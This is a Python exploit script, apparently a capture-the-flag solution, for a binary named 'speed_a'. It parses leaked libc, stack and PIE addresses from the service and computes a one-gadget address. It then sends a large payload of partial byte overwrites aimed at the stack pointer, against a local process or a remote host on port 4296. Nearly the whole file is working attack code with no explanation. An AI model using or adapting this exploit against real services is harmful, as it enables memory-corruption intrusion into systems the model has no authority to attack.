#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './speed_a'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False, 'gdbscript':'', 'env':{'LD_PRELOAD':'./libc.so.6'}}, \
                        local   = {'argv':[bin_file], 'env':{'LD_PRELOAD':'./libc.so.6'}}, \
                        remote  = {'host':'target', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select('debug')

#==========

binf = ELF(bin_file)
ofs_bye             = binf.sep_function['bye']

libc = ELF(env.libc) if env.libc else binf.libc
ofs_libc_main           = libc.sep_function['__libc_start_main']

#==========

def attack(conn, **kwargs):
    conn.recvuntil(b'- libc:')
    addr_libc_main = int(conn.recvline(keepends=False) , 16)
    libc.address = addr_libc_main - ofs_libc_main
    info('addr_libc_base    = 0x{:012x}'.format(libc.address))
    addr_libc_onegadget = libc.address + 0x10d9ca
    addr_libc_gets      = libc.sep_function['gets']

    conn.recvuntil(b'- stack:')
    addr_stack = int(conn.recvline(keepends=False) , 16)
    info('addr_stack        = 0x{:012x}'.format(addr_stack))

    conn.recvuntil(b'- pie:')
    addr_bye = int(conn.recvline(keepends=False) , 16)
    binf.address = addr_bye - ofs_bye
    info('addr_binf_base    = 0x{:012x}'.format(binf.address))
    
    exploit  = b'a'
    for _ in range(0x10000//0x10 - 1):
        exploit += b'b'*0xf
        exploit += p8((addr_stack - 0x10+1) & 0xff)
    exploit += b'c'*0xf
    exploit += p8((addr_stack + 0x18) & 0xff)
    exploit += p64(0xdeadbeef)

    conn.sendafter(b'data: ', exploit)

class Pwn:
    def __init__(self, conn):
        self.recv           = conn.recv
        self.recvuntil      = conn.recvuntil
        self.recvline       = conn.recvline
        self.unrecv         = conn.unrecv
        self.send           = conn.send
        self.sendline       = conn.sendline
        self.sendafter      = conn.sendafter
        self.sendlineafter  = conn.sendlineafter

    def func(self):
        self.sendlineafter(b'> ', b'1')

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()

if __name__=='__main__':
    main()

#==========
